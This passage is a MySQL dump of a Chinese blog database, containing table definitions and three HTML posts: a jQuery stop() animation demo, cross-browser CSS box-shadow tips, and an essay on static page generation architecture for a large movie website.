-- MySQL dump 10.13  Distrib 5.5.3-m3, for Win32 (x86)
--
-- Host: localhost    Database: blog
-- ------------------------------------------------------
-- Server version	5.5.3-m3-community

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `attachment`
--

DROP TABLE IF EXISTS `attachment`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `attachment` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `blog_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '所属博客id',
  `path` varchar(255) NOT NULL DEFAULT '' COMMENT '附件路径',
  `origin_name` varchar(255) NOT NULL DEFAULT '' COMMENT '原始文件名',
  `creation_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间',
  `modification_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '修改时间',
  `is_deleted` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '是否被删除',
  PRIMARY KEY (`id`),
  KEY `blog_id` (`blog_id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COMMENT='附件表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `attachment`
--

LOCK TABLES `attachment` WRITE;
/*!40000 ALTER TABLE `attachment` DISABLE KEYS */;
INSERT INTO `attachment` VALUES (1,1,'1429088064_965972.rar','测试文件.rar',1429088064,0,0),(2,8,'1429363940_639343.html','js+css无限级菜单实例.html',1429363940,0,0),(3,15,'1429439341_970001.rar','测试文件和相关js文件下载.rar',1429439341,0,0);
/*!40000 ALTER TABLE `attachment` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `blog`
--

DROP TABLE IF EXISTS `blog`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `blog` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `category_id` int(11) unsigned NOT NULL DEFAULT '0',
  `title` varchar(255) NOT NULL DEFAULT '' COMMENT '博客标题',
  `content` text NOT NULL COMMENT '博客正文',
  `attachments` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '拥有的附件数量',
  `creation_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间',
  `modification_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '修改时间',
  `is_deleted` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '是否被删除',
  PRIMARY KEY (`id`),
  UNIQUE KEY `unique_title` (`title`),
  KEY `category_id` (`category_id`)
) ENGINE=MyISAM AUTO_INCREMENT=164 DEFAULT CHARSET=utf8 COMMENT='博客表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `blog`
--

LOCK TABLES `blog` WRITE;
/*!40000 ALTER TABLE `blog` DISABLE KEYS */;
INSERT INTO `blog` VALUES (1,2,'jquery 停止动画 stop的几种用法','<p>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;<br />\r\n&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;<br />\r\n&lt;head&gt;<br />\r\n&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;<br />\r\n&lt;title&gt;Panel&lt;/title&gt;<br />\r\n&lt;style type=&quot;text/css&quot;&gt;<br />\r\n* {<br />\r\n&nbsp;&nbsp;&nbsp; margin: 0;<br />\r\n&nbsp;&nbsp;&nbsp; padding: 0;<br />\r\n}<br />\r\nbody {<br />\r\n&nbsp;&nbsp;&nbsp; font-size: 13px;<br />\r\n&nbsp;&nbsp;&nbsp; line-height: 130%;<br />\r\n&nbsp;&nbsp;&nbsp; padding: 60px<br />\r\n}<br />\r\n#panel {<br />\r\n&nbsp;&nbsp;&nbsp; width: 60px;<br />\r\n&nbsp;&nbsp;&nbsp; border: 1px solid #0050D0;<br />\r\n&nbsp;&nbsp;&nbsp; height: 22px;<br />\r\n&nbsp;&nbsp;&nbsp; overflow: hidden;<br />\r\n}<br />\r\n.head {<br />\r\n&nbsp;&nbsp;&nbsp; padding: 5px;<br />\r\n&nbsp;&nbsp;&nbsp; background: #96E555;<br />\r\n&nbsp;&nbsp;&nbsp; cursor: pointer;<br />\r\n&nbsp;&nbsp;&nbsp; width: 300px;<br />\r\n}<br />\r\n.content {<br />\r\n&nbsp;&nbsp;&nbsp; padding: 10px;<br />\r\n&nbsp;&nbsp;&nbsp; text-indent: 2em;<br />\r\n&nbsp;&nbsp;&nbsp; border-top: 1px solid #0050D0;<br />\r\n&nbsp;&nbsp;&nbsp; display: block;<br />\r\n&nbsp;&nbsp;&nbsp; width: 280px;<br />\r\n}<br />\r\n&lt;/style&gt;<br />\r\n&lt;script src=&quot;jquery-1.9.1.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;<br />\r\n&lt;script type=&quot;text/javascript&quot;&gt;<br />\r\n$(function(){<br />\r\n&nbsp;&nbsp;&nbsp; $(&quot;button:eq(0)&quot;).click(function(){<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $(&quot;#panel&quot;).animate({height:&quot;150&quot; }, 1000)<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; .animate({width:&quot;300&quot; }, 1000)<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; .hide(2000)<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; .animate({height:&quot;show&quot;, width:&quot;show&quot;, opacity:&quot;show&quot;}, 1000)<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; .animate({height:&quot;500&quot;}, 1000);<br />\r\n&nbsp;&nbsp;&nbsp; });<br />\r\n&nbsp;&nbsp; &nbsp;//stop([clearQueue][,gotoEnd]);<br />\r\n//语法结构<br />\r\n&nbsp;&nbsp;&nbsp; $(&quot;button:eq(1)&quot;).click(function(){<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $(&quot;#panel&quot;).stop();//停止当前动画，继续下一个动画<br />\r\n&nbsp;&nbsp;&nbsp; });<br />\r\n&nbsp;&nbsp;&nbsp; $(&quot;button:eq(2)&quot;).click(function(){<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $(&quot;#panel&quot;).stop(true);//清除元素的所有动画<br />\r\n&nbsp;&nbsp;&nbsp; });<br />\r\n&nbsp;&nbsp;&nbsp; $(&quot;button:eq(3)&quot;).click(function(){<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $(&quot;#panel&quot;).stop(false, true);//让当前动画直接到达末状态 ，继续下一个动画<br />\r\n&nbsp;&nbsp;&nbsp; });<br />\r\n&nbsp;&nbsp;&nbsp; $(&quot;button:eq(4)&quot;).click(function(){<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $(&quot;#panel&quot;).stop(true, true);//清除元素的所有动画，让当前动画直接到达末状态<br />\r\n&nbsp;&nbsp;&nbsp; });<br />\r\n});<br />\r\n&lt;/script&gt;<br />\r\n&lt;/head&gt;<br />\r\n&lt;body&gt;<br />\r\n&lt;button&gt;开始一连串动画&lt;/button&gt;<br />\r\n&lt;button&gt;stop()&lt;/button&gt;<br />\r\n&lt;button&gt;stop(true)&lt;/button&gt;<br />\r\n&lt;button&gt;stop(false,true)&lt;/button&gt;<br />\r\n&lt;button&gt;stop(true,true)&lt;/button&gt;</p>\r\n\r\n<p>&lt;div id=&quot;panel&quot;&gt;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;h5 class=&quot;head&quot;&gt;什么是jQuery?&lt;/h5&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; &lt;div class=&quot;content&quot;&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jQuery是继Prototype之后又一个优秀的JavaScript库，它是一个由 John Resig 创建于2006年1月的开源项目。jQuery凭借简洁的语法和跨平台的兼容性，极大地简化了JavaScript开发人员遍历HTML文档、操作DOM、处理事件、执行动画和开发Ajax。它独特而又优雅的代码风格改变了JavaScript程序员的设计思路和编写程序的方式。<br />\r\n&nbsp;&nbsp;&nbsp; &lt;/div&gt;<br />\r\n&lt;/div&gt;</p>\r\n\r\n<p>&lt;/body&gt;<br />\r\n&lt;/html&gt;</p>\r\n',1,1429088064,0,0),(2,4,'CSS阴影效果（兼容N多浏览器）','<p>一、无关紧要碎碎念<br />\r\n在web页面的ui表现中，投影效果可以说是非常常见的一种表现效果了。例如开心网的头像修饰效果：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150415171240293194.jpg\" style=\"height:179px; width:467px\" /></p>\r\n\r\n<p>然而，在CSS2的时代，我们多半使用图片实现类似效果，或是使用CSS其他属性模拟阴影效果，但是，现在，CSS3的崛起使得这个问题已经不再是是个问题了，本文就将展示如何实现跨浏览器的盒阴影效果。</p>\r\n\r\n<p>二、标准方法<br />\r\n标准方法当然就是指使用CSS3的方法了，这个应该不少同行应该知道，参见如下代码：<br />\r\n.shadow{<br />\r\n&nbsp;&nbsp; &nbsp;-moz-box-shadow: 3px 3px 4px #000;<br />\r\n&nbsp;&nbsp; &nbsp;-webkit-box-shadow: 3px 3px 4px #000;<br />\r\n&nbsp;&nbsp; &nbsp;box-shadow: 3px 3px 4px #000;<br />\r\n}<br />\r\n释义为：横向偏移3像素，纵向偏移3像素，模糊4像素，颜色为纯黑。<br />\r\n如果我们把含上面样式的这个class shadow应用到图片上，就会产生如下的效果（截自Firefox3.6）：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150415171413206649.jpg\" style=\"height:250px; width:320px\" /></p>\r\n\r\n<p>三、那么IE浏览器呢？<br />\r\n对于目前对CSS3支持如狗屎的孤芳自赏的IE浏览器怎么办呢？box-shadow属性对于IE浏览器就像是圣诞树上的彩灯&mdash;&mdash;装饰而已。<br />\r\n好在IE浏览器有个IE <a href=\"http://msdn.microsoft.com/en-us/library/ms533086%28VS.85%29.aspx\">shadow滤镜</a>，是IE浏览器私有的一个东西，可以模拟还凑合的盒阴影效果，使用类似于下面的代码：<br />\r\n.shadow {<br />\r\n&nbsp;&nbsp; &nbsp;/* For IE 8 */<br />\r\n&nbsp;&nbsp; &nbsp;-ms-filter: &quot;progid:DXImageTransform.Microsoft.Shadow(Strength=4, Direction=135, Color=&#39;#000000&#39;)&quot;;<br />\r\n&nbsp;&nbsp; &nbsp;/* For IE 5.5 - 7 */<br />\r\n&nbsp;&nbsp; &nbsp;filter: progid:DXImageTransform.Microsoft.Shadow(Strength=4, Direction=135, Color=&#39;#000000&#39;);<br />\r\n}<br />\r\n将shadow这个class应用到图片上，结果如下（截自IE6浏览器）：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150415171529546704.jpg\" style=\"height:247px; width:297px\" /></p>\r\n\r\n<p>虽然效果不及Firefox，chrome等现代浏览器，但是还能凑合着用用。</p>\r\n\r\n<p>四、样式综合<br />\r\n如下代码：<br />\r\n.shadow{<br />\r\n&nbsp;&nbsp; &nbsp;-moz-box-shadow: 3px 3px 4px #000;<br />\r\n&nbsp;&nbsp; &nbsp;-webkit-box-shadow: 3px 3px 4px #000;<br />\r\n&nbsp;&nbsp; &nbsp;box-shadow: 3px 3px 4px #000;<br />\r\n&nbsp;&nbsp; &nbsp;/* For IE 8 */<br />\r\n&nbsp;&nbsp; &nbsp;-ms-filter: &quot;progid:DXImageTransform.Microsoft.Shadow(Strength=4, Direction=135, Color=&#39;#000000&#39;)&quot;;<br />\r\n&nbsp;&nbsp; &nbsp;/* For IE 5.5 - 7 */<br />\r\n&nbsp;&nbsp; &nbsp;filter: progid:DXImageTransform.Microsoft.Shadow(Strength=4, Direction=135, Color=&#39;#000000&#39;);<br />\r\n}<br />\r\n更多CSS3属性的跨浏览器支持可以查阅<a href=\"http://css3please.com\">这里(css3please.com)</a>。</p>\r\n\r\n<p>五、浏览器支持情况<br />\r\n&nbsp;&nbsp;&nbsp; Firefox 3.5+<br />\r\n&nbsp;&nbsp;&nbsp; Safari 3+<br />\r\n&nbsp;&nbsp;&nbsp; Google Chrome<br />\r\n&nbsp;&nbsp;&nbsp; Opera 10.50<br />\r\n&nbsp;&nbsp;&nbsp; Internet Explorer 5.5</p>\r\n',0,1429089609,0,0),(3,6,'谈谈网站静态化','<p><strong><span style=\"font-size:22px\">写在前头</span></strong><br />\r\n静态化是解决减轻网站压力,提高网站访问速度的常用方案,但在强调交互的We2.0 时代,对静态化提出了更高的要求,静态不仅要能静,还要能动,下面我通过一个项目,谈谈网站静态化后的架构设计方案,同时和大家探讨一下,在开源产品大行其道,言架构必称MemberCache, Nginx,的时代,微软技术在网站架构设计中的运用.</p>\r\n\r\n<p><strong><span style=\"font-size:22px\">静态化的设计原则和步骤</span></strong><br />\r\n静态化是解决减轻网站压力,但是静态化也会带来一系列的问题,包括开发上复杂度的增加,维护难度的增加,运用不的当,更可能适得其反,而许多替代方案,比如页面缓存,如果运用得当,也能起到很好的效果,所以在开始之前,必须进行详细的考察,确定是否适合静态化,并制定适合的静态化方式,下面先介绍一下</p>\r\n\r\n<p><strong><span style=\"font-size:16px\">1考查读写比:</span></strong><br />\r\n&nbsp;&nbsp; &nbsp;读写比,准确的说是读写负荷比,是否值得静态化的最终考虑,由于一般写入的压力明显大于读出的压力,如果写入太频繁,或者每次写入消耗的资源太多,都不能达到效果,我觉得读写比例10:1应该是个上限.具体情况需要根据自己的业务逻辑判断</p>\r\n\r\n<p><strong><span style=\"font-size:16px\">2确定页面呈现的内容是否适合静态化:</span></strong><br />\r\n&nbsp;&nbsp; &nbsp;在设计方案时,必须详细考虑每个原型页面,找到页面上展示的信息,和他的更新方式,更新时机,更新频率,一定要注意那些不起眼的信息,他们可能左右你的设计,<br />\r\n&nbsp;&nbsp; &nbsp;比如:我们以CSDN的论坛的任意一篇帖子为例,进行分析</p>\r\n\r\n<p><br />\r\n<img alt=\"\" src=\"/data/pic/20150415175234417312.jpg\" style=\"height:466px; width:512px\" /></p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;上面的帖子中呈现的内容主要是这样几块,帖子内容,回复内容,发帖人回复人的用户信息<br />\r\n&nbsp;&nbsp; &nbsp;帖子内容和回复内容在发帖时更新,发帖后用户可以修改其内容,更新频率高<br />\r\n&nbsp;&nbsp; &nbsp;用户信息,用户修改个人信息时可能会发生更改,用户等级增加时也可能发生更改,比如加星,更新频率低<br />\r\n&nbsp;&nbsp; &nbsp;回复数将每次回复后都要更改,更新频率高<br />\r\n&nbsp;&nbsp; &nbsp;设计时要注意细节,如上图中圈出来的部分,这些部分是怎么修改的,频率有多大,一个都不能放过</p>\r\n\r\n<p><strong><span style=\"font-size:16px\">3确定生成方式:</span></strong><br />\r\n&nbsp;&nbsp; &nbsp;在上面帖子一例中.每次更改都重新生成页面是不可取的,一篇比回复数多的帖子,需要的数据量是巨大的(每层楼的用户信息,回复内容),任何修改,都需要重新取出数据进行生成是不能允许的.一般除非你的页面基本不用更新,或者更新开销极小,(比如一段嵌入的广告代码)才能采用整体更新的方式,不然就需要我们找到合适的更新页面局部区域的方法:<br />\r\n&nbsp;&nbsp; &nbsp;一般有下面两个方法:</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;<strong>1)正则修改法:</strong><br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;比如,如果帖子中的回复数,html代码是这样<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;label&gt;回复数&lt;var id=&quot;replyCount&quot;&gt;34&lt;/var&gt;&lt;/label&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;我们可以通过用下面正则来查找并替换计数<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;(?&lt;=id=&quot;replyCount&quot;&gt;)d{1,}<br />\r\n&nbsp;&nbsp; &nbsp;<strong>2)页面区域分块:</strong><br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;把页面分成很多小块,在显示时组装起来,比如DotText就采用这个方法</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150415182538857397.jpg\" style=\"height:441px; width:379px\" /></p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;这是一篇典型的Dottext blog页面,其中红色标定部分是一个独立的文件,而黄色框内的是脚本动态加载,这些部分在最终显示的时候组合起来,最终构成了一篇Blog,具体的组合方法也有多种,可以使用Include,也可以自己来实现.DotText就自己实现了一套加载机制</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;上面的两种方法并不孤立,并可以根据需要,配合使用</p>\r\n\r\n<p><strong><span style=\"font-size:16px\">4确定需要动态加载的信息:</span></strong><br />\r\n&nbsp;&nbsp; &nbsp;页面上总有一些内容看起来不太适合静态化,最典型的是一些统计结果,比如如果你在做一个图书介绍页面,可能就会需要展示图书的当天综合评分,或者书籍排名,这些内容需要用脚本进行动态加载<br />\r\n&nbsp;&nbsp; &nbsp;既然做了静态化,就是希望减少服务器负载,动态加载的数据总是不得已而为之,有的时候在需求允许的情况下,我们在数据在实时性和性能方面做一些妥协,比如上面帖子中的用户星级和昵称,从数据实时性上说,当用户的星级增长,他发言的所有帖子都应该发生变化,所以应该用动态加载.然而其实上这些信息如果不发生变化,也无伤大雅,用户反而能够看到自己在多年前发帖时的级别和昵称.</p>\r\n\r\n<p><strong><span style=\"font-size:22px\">现实中的项目</span></strong><br />\r\n&nbsp;&nbsp; &nbsp;X网站是大型的电影资讯,电影社区,向外提供电影相关信息服务,以及用户社区,其中信息服务部分, 其中大部分页面属于信息呈现页,读取量比较大,百万级别pv,信息主要由编辑在后台发布,更新较少,但其页面上有大量的交互性的内容,比如评论,收藏列表,同时许多内容允许用户创造,比如上传图片,添加注释.交互内容的数量和交互的频繁程度,都超过了普通的咨询页面,这次调整,准备将其中访问量最大的几块:电影资料页,影人资料页,进行静态化,如果成功,还将运用到更多的频道,基本实现全站静态化<br />\r\n&nbsp;&nbsp; &nbsp;通过对页面设计和前一版本的分析,下面是具有挑战性的地方.这些特点基本使用于大多数web2.0的站点,很具有典型意义</p>\r\n\r\n<p><strong><span style=\"font-size:16px\">1页面生成的触发条件复杂</span></strong><br />\r\n&nbsp;&nbsp; &nbsp;一般论坛中的帖子或者blog,更新方式比较单一:主要是由回复进行触发还有少数的修改动作,然而该网站一个页面上需要根据不同触发条件就有20多个, 比如光二级菜单:用户发布图片,删除图片,发布或者删除影片信息,发布或者修改视频,后台修改电影信息,都有可能触发</p>\r\n\r\n<p><strong><span style=\"font-size:16px\">2一个动作触发生成的页面可能很多而且相互交叠</span></strong><br />\r\n&nbsp;&nbsp; &nbsp;每一个动作都会触发一系列的生成,并且不同动作可能都会涉及同一个页面或者区域的生成.<br />\r\n&nbsp;&nbsp; &nbsp;比如:用户给一步电影评分,需要生成评分更多页,评分统计更多页,首页右侧谁还关注此影片小区域,等等.用户收藏一个影片,也需要更新首页右侧谁还关注此影片小区域</p>\r\n\r\n<p><strong><span style=\"font-size:16px\">3触发频繁</span></strong><br />\r\n&nbsp;&nbsp; &nbsp;虽然不及某些更大规模的网站,但是由于涉及众多用户参与的内容,评论,收藏等等,触发点多,发生频度相当频繁</p>\r\n\r\n<p><strong><span style=\"font-size:16px\">4页面多,结构复杂,空间占用大</span></strong><br />\r\n&nbsp;&nbsp; &nbsp;通常,需要生成的页面规模是这样粗略估算的,Rn*P,Rn为资源数,P为每个资源的页面数,所谓资源,可以看做一个生成单位,其页面数可以简单看做发布一个资源,就需要生成其所有相关页面数量,比如:发布一个blog,就需要生成一个Blog页,同时还需要生成或者更新个人主页的blog列表,算上个人主页右侧的分类文章数的小块,也就是最多10来个页面或者区域,但是发布一个电影,其相关的页面至少有50个以上,而且有的页面还带有分页,一个信息比较丰富的电影,其页面竟可以达到千个以上,空间10~20M,而且资源总数也不少,电影80000左右,电影人虽然P值较少,但是总量确有几十万之巨,估计静态页面磁盘占用量几百个G</p>\r\n\r\n<p><strong><span style=\"font-size:16px\">5向下兼容</span></strong><br />\r\n&nbsp;&nbsp; &nbsp;这是一个已有系统,旧系统的框框需要突破,但又没有时间,或者不能完全突破,比如Url,已经被收录到搜索引擎,就不能随便调整,还有一些地方,原本没有为静态生成考虑,另一些地方又需要兼容旧的设计</p>\r\n\r\n<p><strong><span style=\"font-size:16px\">6多台前端Web</span></strong><br />\r\n&nbsp;&nbsp; &nbsp;这种结构要求生成的文件可能需要分布到多个服务器(另一个方案是放在几台专用的机器上,等前端来取)</p>\r\n\r\n<p><strong><span style=\"font-size:16px\">7任务紧迫</span></strong><br />\r\n&nbsp;&nbsp; &nbsp;架构讨论结束仪式六月初,离奥运开幕上线只有两月,也就是说所有底层框架实现,页面模板开发,调试测试,动作的整理,必须在7月底全部完成,按我原来估计,光实现这几块的上百个页面模板和填充方法,也需要那么长的时间</p>\r\n\r\n<p>综合考虑上述因素,架构必须要有以下几个方面的特点<br />\r\n1动作可以灵活扩展配置,某个动作对应哪些生成,应该可以配置,并且可以分组<br />\r\n2文件必须有分发机制<br />\r\n3分发和生成必须独立出来,并且支持分布式<br />\r\n4各种的动作,必须转化为消息,发送到生成和分发服务器进行处理<br />\r\n5针对同意资源频繁动作,在变量相同的情况下能够具有合并的能力<br />\r\n6动作必须有记录<br />\r\n7尽量考虑使用已有成熟技术,节省开发时间</p>\r\n\r\n<p><strong><span style=\"font-size:22px\">下面是设计的第一个架构</span></strong></p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150415183039307888.jpg\" style=\"height:272px; width:554px\" /></p>\r\n\r\n<p>用户的动作经过MSMQ<a href=\"#tar1\">[1]</a>传入到生成分发中心(途中绿色箭头)进行处理,,处理中心接受到消息后,负责生成对应的页面或者页面区域,并将页面分发到各个服务器,负载均衡沿用以前的架构,采用微软的NLB<a href=\"#tar2\">[2]</a></p>\r\n\r\n<p>之所以用MSMQ,就是看上了他提供的完整的消息存储恢复机制,这样我们能确保即使服务器down掉重启后,消息依然能正常处理,碰巧我们cms组的同事MSMQ非常熟悉,并且真准备在另外一个项目中使用类似的架构&mdash;于是一拍即合</p>\r\n\r\n<p>页面采用分块存储,这样能保证生成时目标小,开销小,也能重用性,然后再藉由SSI<a href=\"#tar3\">[3]</a>(shtml include)进行整合,之所以采取这样的方案,而不采用Dottext的整合方式,是因为如果采用Dottext的方式,就必须走IIS和.Net的管道<a href=\"#tar4\">[4]</a>,而据测试,经过管道和直接返回html性能有非常大的差异,而使用ssi,在性能上是一个折中,并且可以Light HTTPd等高性能web服务器</p>\r\n\r\n<p>模板生成方式,采用了XSLT和另外一种自定义的模板(我的同事开发的机制,很有趣, 理论上能把传统模板替换的性能开销全部消除),生成的最终产物是shtml,之所以生成shtml是为了使用其ssi(Server Side Include)的特性,保证一定的灵活性,并实现热点数据的分离:某些页面上的部分可能会频繁更新和生成,而其它地方不变,或者某个部分是所有页面通用的(比如页头和页脚),较之php下常常使用smarty,生成php文件,虽然灵活性不如php,但是性能上不相上下,还略高.</p>\r\n\r\n<p>但是这个设计的问题是动态内容和静态内容没有分开,生成的html页面,和动态页面都放在前端服务器上,通过负载均衡访问,也造成了分发服务器需要分发到多台服务器,网络IO效率较低,而且静态内容需要的磁盘空间很大,且小文件非常多,和动态页面混在一起不便于优化,所以第二个方案对生成的静态内容与动态内容使用不同的服务器</p>\r\n\r\n<p><strong><span style=\"font-size:22px\">方案二:</span></strong></p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150415183121922381.jpg\" style=\"height:272px; width:554px\" /></p>\r\n\r\n<p>我们把生成的静态文件单独放置,可以看到,前端增加Nginx,作为跳转,把电影,影人资料库的页面转向静态服务器,其他的调用转向动态服务器,这样我们就可以单独为静态服务器进行优化,比如采用更高效的服务器等等.</p>\r\n\r\n<p>同时减少了文件分发的次数(甚至可以只分发到本机),提高生成分发的处理能力</p>\r\n\r\n<p>更进一步,可以把图片服务分到另外一组机器上,使用独立的域名,比如img.xxx.com,这样可以有效的减少带宽</p>\r\n\r\n<p><strong><span style=\"font-size:22px\">最终完整架构:</span></strong></p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150415183234894284.jpg\" style=\"height:458px; width:554px\" /></p>\r\n\r\n<p><strong><span style=\"font-size:22px\">文件生成分发中心</span></strong></p>\r\n\r\n<p>下图是文件生成分发中心的工作流程图</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150415183356348922.jpg\" style=\"height:293px; width:526px\" /></p>\r\n\r\n<p>生成服务对外只有一个输入,就是消息,一个输出:静态文件,内部根据消息,从配置文件中找到对应的生成方法,取出相应的模板,进行数据填充</p>\r\n\r\n<p>分发服务主要吧生成服务产生的文件进行分发,分发到前端的N台服务器上,开始考虑得比较复杂,希望分发服务可以跨越协议(本地文件系统,局域网,http协议),跨越多种存储介质(文件系统,数据库),实际最后定下来基本是本地文件系统或者局域网传输</p>\r\n\r\n<p><strong>注:上图中文件分发的部分也可以通过定制MogileFS,来实现分布式文件系统</strong></p>\r\n\r\n<p><strong><span style=\"font-size:22px\">马后炮:</span></strong></p>\r\n\r\n<p>总结起来,静态化除了对架构方面的影响,对开发和测试流程也有影响<br />\r\n<strong><span style=\"font-size:16px\">对测试提出更高的要求:</span></strong><br />\r\n因为一旦上线后,某个页面发现问题,即使是文字的修改,也需要重新生成许多页面,所以测试人员必须非常仔细,测试周期也需要延长</p>\r\n\r\n<p><strong><span style=\"font-size:16px\">开发人员需要掌握模板语言:</span></strong><br />\r\n需要掌握一种模板预言,无论是Xslt还是自己开发的模板语言,都需要花一定的时间掌握</p>\r\n\r\n<p><strong><span style=\"font-size:16px\">需要给第一次生成腾出足够时间:</span></strong><br />\r\n如果不是新系统,那么数据迁移和生成的过程就比较痛苦,由于页面众多,第一次生成的过程可能需要以天来计算,在制定上线方案是就需要考虑到这个方面</p>\r\n\r\n<p>Nginx作为前端的跳转,根据其他网站的经验,应该可以达到2-3万并发连接,但是使用之后,常常有卡壳的情况发生,具体症状为在浏览器中访问页面时,连接超时,或者一直不响应,此时Nginx连接数并不高,好在还有第一套方案可以备用,让我们有时间去解决这个问题,如果大家对这个问题有什么心得,欢迎交流<br />\r\n我的联系方式<br />\r\nMSN:yizhu2000@hotmail.com<br />\r\nGtalk:yizhu2005@gmail.com</p>\r\n\r\n<p><strong><span style=\"font-size:22px\">篇后:</span></strong><br />\r\n在大型web开发上,我感到微软产品结构(包括微软开源社区的成果)在某些方面还存在一些不足:</p>\r\n\r\n<p><strong><span style=\"font-size:16px\">高性能服务器选择太少</span></strong><br />\r\nLinux下可以采用Light HTTPd,Nginx等诸多服务器,这些服务器在很多方面的表现会让Windows下唯一的选择--IIS相形见绌</p>\r\n\r\n<p><strong><span style=\"font-size:16px\">分布式文件系统</span></strong><br />\r\n微软及其社区没有比较著名的产品出现,Linux下有MogileFS</p>\r\n\r\n<p><strong><span style=\"font-size:16px\">微软架构下,文件系统选择太少</span></strong><br />\r\n在Linux下我们可以选择诸如Ext3,ReiserFS,而Windows环境下,NTFS是唯一的选择,不过值得称道的是.NTFS的效率和稳定性都相当不错.</p>\r\n\r\n<p><strong><span style=\"font-size:16px\">开源技术对windows版本的支持态度不积极</span></strong><br />\r\n诸多在Linux下名声卓著的开源产品,又懒于为Windows提供相应的版本,或者提供的windows版本效果差强人意.使得采用微软服务器的厂商少了很多选择</p>\r\n\r\n<p>现在的Web开发已经进入了各种技术大混合,大整合的时代,任何一个厂商都不可能涵盖所有方面,在后端架构和逻辑方面.Net和Java严谨,良好的编程风格,清晰的设计思路,较高的运行效率,以及稳定的配套服务支持,是其最大的优势,对主要擅长微软技术的Web工程师和架构师而言,应该增进对Linux及开源社区的了解,才能根据需求设计出合理的架构</p>\r\n\r\n<hr />\r\n<p><a id=\"tar1\" name=\"tar1\">[1]</a>Message Queuing: A Scalable, Highly Available Load-Balancing Solution<br />\r\nhttp://msdn.microsoft.com/en-us/library/ms811052.aspx</p>\r\n\r\n<p><a id=\"tar2\" name=\"tar2\">[2]</a>网络负载平衡(NLB)详解,注意文章后给出的参考链接<br 